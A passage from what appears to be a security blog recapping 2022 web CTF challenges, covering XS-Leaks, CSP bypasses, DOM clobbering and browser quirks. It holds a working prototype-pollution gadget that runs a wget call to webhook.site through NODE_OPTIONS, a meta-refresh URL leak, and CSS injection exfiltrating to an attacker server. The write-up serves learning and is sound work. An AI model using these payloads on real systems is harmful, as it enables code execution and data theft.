<p>Here is a great paper for reference: <a target="_blank" rel="noopener" href="https://arxiv.org/abs/2207.11171">Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js</a></p>
<p>But the gadget mentioned in the paper has been fixed, so you need to find another one yourself, and the result is as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"."</span><span class="token operator">:</span> <span class="token string">"./preinstall.js"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'./usage'</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/opt/yarn-v1.22.19'</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">"node"</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span><span class="token string">"npm_config_global"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>env <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string-property property">"NODE_DEBUG"</span><span class="token operator">:</span> <span class="token string">"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site?q=2').toString());process.exit()//"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require=/proc/self/environ"</span>
<span class="token punctuation">&#125;</span>

<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage.js'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Details can be found in the complete writeup: <a href="https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#balsn-ctf-2022-2linenodejs">https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#balsn-ctf-2022-2linenodejs</a></p>
<h2><span id="xsleaks">XSleaks</span></h2><h3><span id="dicectf-2022-carrot">DiceCTF 2022 - carrot</span></h3><p>In short, this problem uses <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">connection pool</a> to measure response time.</p>
<p>You may think that measuring response time is not difficult. Just use fetch and calculate it yourself, right? But if there is a SameSite cookie, fetch cannot be used, and some XSleaks tricks are needed to measure time.</p>
<p>In Chrome, the number of sockets is limited, generally 255, and headless is 99. Assuming we first consume the socket to only one left, at this time, we visit the URL we want to measure the time (called reqSearch), and at the same time, send another request to our own server (called reqMeasure).</p>
<p>Since there is only one socket left, the time from reqMeasure sending the request to receiving the response is <code>the time reqSearch takes + the time reqMeasure takes</code>. If the time reqMeasure takes is about the same, then we can easily measure the time reqSearch takes.</p>
<p>Detailed writeup: <a href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fcarrot1-solves">https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fcarrot1-solves</a></p>
<h3><span id="tsj-ctf-2022-nim-notes">TSJ CTF 2022 - Nim Notes</span></h3><p>In this problem, you can achieve CRLF injection, but the position is at the bottom, so you cannot override CSP and XSS. How to steal the content of the page?</p>
<p>Assuming that the content to be stolen is in <code>&lt;script&gt;</code>, you can use the header <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only">Content-Security-Policy-Report-Only</a>, because when it violates the rules, it will send a JSON to the specified location, which will include the first 40 characters of the script.</p>
<p>Complete writeup: <a href="https://blog.huli.tw/2022/03/02/en/tsj-ctf-2022-nim-notes/">https://blog.huli.tw/2022/03/02/en/tsj-ctf-2022-nim-notes/</a></p>
<h3><span id="ångstromctf-2022-sustenance">ångstromCTF 2022 - Sustenance</span></h3><p>There is a search function, and the difference between success and failure lies in the URL.</p>
<p>For example, success is: <code>/?m=your search...at 1651732982748 has success....</code>, and failure is: <code>/?m=your search...at 1651732982748 has failed</code></p>
<p>There are two solutions. One is to use fetch to measure whether it is in the cache, as the response will be cached. Although Chrome has implemented Cache partition, headless has not yet.</p>
<p>The second is to use cookie tossing with other same site domains to construct a cookie bomb. When the search is successful, the payload will be too large (because there are a few more characters in the URL), and there will be no problem when it fails, thus measuring the difference.</p>
<p>Complete writeup: <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#webx2fsustenance">https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#webx2fsustenance</a></p>
<h3><span id="justctf-2022-ninja">justCTF 2022 - Ninja</span></h3><p>A new xsleak that uses <code>:target</code> with <code>:before</code> to load images.</p>
<p>For details, please refer to: <a target="_blank" rel="noopener" href="https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/">New technique of stealing data using CSS and Scroll-to-Text Fragment feature.</a></p>
<p>Complete writeup: <a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves</a></p>
<h3><span id="sekaictf-2022-safelist">SekaiCTF 2022 - safelist</span></h3><p>Use lazy-loading images to send requests to the server to slow down the server speed, and use timing attacks to determine whether the image is loaded.</p>
<p>You can also use the connection pool or other elements mentioned earlier to solve it.</p>
<p>Writeup: <a href="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/">https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/</a></p>
<h2><span id="front-end-domx2fbom-related-knowledge">Front-end DOM&#x2F;BOM related knowledge</span></h2><h3><span id="dicectf-2022-shadow">DiceCTF 2022 - shadow</span></h3><p>The core of this problem is how to get things in the shadowDOM. For a more complete study, see: <a target="_blank" rel="noopener" href="https://blog.ankursundara.com/shadow-dom/">The Closed Shadow DOM</a></p>
<p>But the final solution is:</p>
<ol>
<li>Set the CSS <code>-webkit-user-modify</code> property, which is similar to <code>contenteditable</code></li>
<li>Use <code>window.find</code> to find the content</li>
<li>Use <code>document.execCommand</code> to insert HTML and use svg to get the node</li>
</ol>
<p>Detailed writeup: <a href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fshadow0-solves">https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fshadow0-solves</a></p>
<h3><span id="line-ctf-2022-haribote-secure-note">LINE CTF 2022 - Haribote Secure Note</span></h3><p>There are two injection points in this problem. The first is in the script, which can control 16 characters, and the second is HTML injection. The biggest problem is that the CSP is very strict:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default<span class="token punctuation">"</span></span>
          <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>There are three solutions:</p>
<ol>
<li>The magical <a target="_blank" rel="noopener" href="https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state">script data double escaped state</a></li>
<li><code>import()</code> will not be blocked by Trusted Types</li>
<li>Use <code>&lt;iframe src=&#39;/p&#39;&gt;</code> to execute code on other pages to bypass CSP</li>
</ol>
<p>Here is a great article: <a target="_blank" rel="noopener" href="https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types">Eliminating XSS from WebUI with Trusted Types</a></p>
<p>Complete writeup: <a href="https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/#haribote-secure-note7-solves">https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/#haribote-secure-note7-solves</a></p>
<h3><span id="m0lecon-ctf-2022-ptmd">m0leCon CTF 2022 - ptMD</span></h3><p>Leak URL using <code>meta</code> combination:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>referrer<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>unsafe-url<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>In a strict CSP state, meta can be used as a breakthrough technique. These meta tags, like the ones above, work even if they are not placed inside the head tag, and even after they are removed.</p>
<p>Full writeup: <a href="https://blog.huli.tw/2022/05/21/en/m0lecon-ctf-2022-writeup/">https://blog.huli.tw/2022/05/21/en/m0lecon-ctf-2022-writeup/</a></p>
<h3><span id="corctf-2022-modernblog">corCTF 2022 - modernblog</span></h3><p>This is a React app that uses <code>dangerouslySetInnerHTML</code> to render your content, which means you get an HTML injection.</p>
<p>But CSP doesn’t allow you to execute scripts: <code>script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
<p>What you need to steal is the URL with the flag ID, which appears on the <code>/home</code> page. If we can do CSS injection on that page, we can steal it like this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">a[href^="/post/0"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=0<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token selector">a[href^="/post/1"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

// ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>And since we are currently on the <code>/posts/:id</code> page, we cannot get the content of the <code>/home</code> page, so we cannot do this.</p>
<p>The key point of this question is a very interesting usage of DOM clobbering. Nowadays, React apps basically use <a target="_blank" rel="noopener" href="https://reactrouter.com/en/main">react-router</a> to do routing. This lib will use <code>document.defaultView.history</code> to see what the URL is and decide which page to render.</p>
<p>And <code>document.defaultView</code> can be affected by DOM clobbering, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultView</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/home</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>In this way, <code>document.defaultView.history</code> becomes <code>/home</code>, so we can render another React app inside the React app using iframe srcdoc, and use the CSS injection mentioned earlier to get the flag ID:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;iframe srcdoc="
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultView</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/home</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    <span class="token selector">a[href^="/post/0"]</span> <span class="token punctuation">&#123;</span>
      <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=0<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token selector">a[href^="/post/1"]</span> <span class="token punctuation">&#123;</span>
      <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>//myserver?c=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>

  react app below<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>module</span> <span class="token attr-name">crossorigin</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/assets/index.7352e15a.js</span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
" height="1000px" width="500px"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>My previous English writeup: <a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/</a></p>
<h3><span id="hitcon-ctf-2022-self-destruct-message">HITCON CTF 2022 - Self Destruct Message</span></h3><p>Originally, when using <code>element.innerHTML = str</code>, it was asynchronous, but using the magical <code>&lt;svg&gt;&lt;svg&gt;</code> can make it synchronous:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">const div = document.createElement('div')
div.innerHTML = '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>'
console.log(2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>It will output 1 first and then 2, and it will take effect without inserting it into the DOM.</p>
<p>Related discussion: <a target="_blank" rel="noopener" href="https://twitter.com/terjanq/status/1421093136022048775">https://twitter.com/terjanq/status/1421093136022048775</a></p>
<p>Writeup: <a href="https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#hitcon-ctf-2022">https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#hitcon-ctf-2022</a></p>
<h3><span id="sekaictf-2022-obligatory-calc">SekaiCTF 2022 - Obligatory Calc</span></h3><p>Two key points:</p>
<ol>
<li><code>e.source</code> in onmessage is the source window that sends the message. Although it looks like an object at first glance, if it is closed immediately after postMessage, it will become null.</li>
<li>Accessing <code>document.cookie</code> under a sandbox iframe will result in an error.</li>
</ol>
<h2><span id="browser-internals-related">Browser internals related</span></h2><h3><span id="googlectf-2022-postviewer">GoogleCTF 2022 - POSTVIEWER</span></h3><p>This question is related to the order in which the browser executes things, as well as site isolation and other things. Through these things, you can construct an iframe-related race condition.</p>
<p>Full writeup: <a href="https://blog.huli.tw/2022/07/09/en/google-ctf-2022-writeup/#postviewer-10-solves">https://blog.huli.tw/2022/07/09/en/google-ctf-2022-writeup/#postviewer-10-solves</a></p>
<h3><span id="uiuctf-2022-modernism">UIUCTF 2022 - modernism</span></h3><p>The code is very simple:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> request
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    prefix <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"uiuctf&#123;FAKEFLAG&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#^uiuctf&#123;[A-Za-z]+&#125;$</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>prefix<span class="token operator">+</span>flag<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After adding the flag you provided and outputting it, although the MIME type is <code>text/plain</code>, because <code>X-Content-Type-Options: nosniff</code> is not added, <code>&lt;script&gt;</code> can still be used to load this part.</p>
<p>However, because the flag contains <code>&#123;&#125;</code>, it cannot be easily made into an executable script (syntax error will keep appearing).</p>
<p>The solution is to add a BOM at the beginning, and the browser will read the entire script in UTF-16, and the flag will become strange Chinese characters and will not be broken. The content to be placed is <code>++window.</code>, and then you can see which property of the window has been changed.</p>
<p>The solution to this problem basically requires knowledge of how the browser reads.</p>
<p>Full writeup: <a href="https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/">https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/</a></p>
<h3><span id="uiuctf-2022-precisionism">UIUCTF 2022 - precisionism</span></h3><p>An extension of the previous challenge, only adding <code>Enjoy your flag!</code> at the end, so the trick mentioned above cannot be used.</p>
<p>The expected solution is to make the response into ICO format, put the part to be leaked into the width, and it is possible to get the width of the image cross-originally, so you can leak the data byte by byte.</p>
<p>Full writeup: <a href="https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/#precisionism3-solves">https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/#precisionism3-solves</a></p>
<h3><span id="seccon-ctf-2022-quals-spanote">SECCON CTF 2022 Quals - spanote</span></h3><p>This question uses bfcache: <a target="_blank" rel="noopener" href="http://web.dev/articles/bfcache">http://web.dev/articles/bfcache</a></p>
<p>Suppose there is an API that looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/notes/:noteId"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>session<span class="token punctuation">.</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"x-token"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">hash</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">const</span> noteId <span class="token operator">=</span> <span class="token function">validate</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>params<span class="token punctuation">.</span>noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">sendNote</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> noteId<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Although it is a GET, it will check the custom header, so theoretically it cannot be viewed by accessing it directly with a browser.</p>
<p>But using bfcache, it can be solved like this:</p>
<ol>
<li>Open <code>/api/notes/id</code> in a new window, and an error screen will appear</li>
<li>Go to the homepage with the same tab. At this time, the homepage will use fetch to fetch <code>/api/notes/id</code> with a custom header, and the browser will store the result in the disk cache</li>
<li>Go back one page, and the screen will display the cached result</li>
</ol>
<p>You can directly browse the cached response in the browser, bypassing the custom header restriction.</p>
<p>Full writeup: <a href="https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#seccon-ctf-2022-quals-spanote">https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#seccon-ctf-2022-quals-spanote</a></p>
<h2><span id="bonus-authors-of-great-web-challenges">Bonus: Authors of Great Web Challenges</span></h2><p>It takes a lot of time and effort to make a good CTF challenge, so I thought I would wrote a bit about these authors since I have already wrote about the challenges.</p>
<p>The first is <a target="_blank" rel="noopener" href="https://twitter.com/ankursundara">Ankur Sundara</a>, a member of the dicegang team. He created the UIUCTF questions mentioned above, and he also created a question related to content type before. I feel that he must have read the Chromium source code related parts before producing those questions.</p>
<p>In addition, he also wrote this research on Shadow DOM: <a target="_blank" rel="noopener" href="https://blog.ankursundara.com/shadow-dom/">The Closed Shadow DOM</a></p>
<p>The second is <a target="_blank" rel="noopener" href="https://twitter.com/terjanq">terjanq</a>, who works at Google. He created the GoogleCTF race condition question mentioned above, and he has also created a lot of classic questions before. He maintains the XSleak wiki, and I always feel that there is nothing he doesn’t know about behavior related to browsers…</p>
<p>He occasionally plays CTF with the justCatTheFish team, and if there are only one or two teams that solve some frontend Web questions, there is a high probability that justCatTheFish is one of them.</p>
<p>The third is <a target="_blank" rel="noopener" href="https://twitter.com/Strellic_">strellic</a>, also from dicegang. He has created a lot of questions and the quality is very good. The writeups are also very detailed. I learned a lot of skills and new ideas from him. He always combines old or known technique and develops a new one.</p>
<p>Of course, there are other impressive people, but I’m too lazy to introduce them one by one XD</p>
<p>For example, the author of the article mentioned at the beginning <a target="_blank" rel="noopener" href="https://twitter.com/arkark_">@arkark_</a>, <a target="_blank" rel="noopener" href="https://twitter.com/zwad3">@zwad3</a>, who created a challenge that still amazes me, frequent solver <a target="_blank" rel="noopener" href="https://twitter.com/parrot409">@parrot409</a>, and <a target="_blank" rel="noopener" href="https://twitter.com/maple3142">@maple3142</a>, who are all very active in CTF.</p>
<h2><span id="summary">Summary</span></h2><p>After writing, I found that I have attempted many challenges (although I couldn’t solve many of them), and some of the challenges, although the concepts are not difficult, are quite troublesome to implement.</p>
<p>In addition, it can be seen that many challenges require looking at the source code of the lib to solve. Personally, I like this kind of question, which gives a real-world feeling. It’s something you use every day, but you don’t know how it works behind the scenes. CTF forces you to understand it. Although it has nothing to do with the web, there were also two or three challenges related to Git this year, which required understanding how Git works to solve.</p>
<p>I learned a lot of techniques that I had no idea about before this year. I feel that my understanding of JS and browsers has improved a bit, but I can foresee that I will still be challenged next year, and there will be more things that I don’t know.</p>
<p>Finally, I would like to thank each challenge author. It is because of these challenge authors who share their research through challenges that others can learn these novel techniques. I personally think that it is harder to make a good challenge than to solve it. If you are solving a challenge, you know that there is an solution somewhere, and you just need to find it. To make a good challenge, you need to discover something new by yourself, which is really difficult. Once again, kudos to every challenge maker.</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2023/01/10/en/security-of-encrypt-or-hash-password-in-client-side/">Is it meaningful to encrypt passwords when calling APIs on the website frontend?</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/12/14/en/rctf-2022-writeup/">RCTF 2022 Notes</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2026 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/12/26/ctf-2022-web-js-summary/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
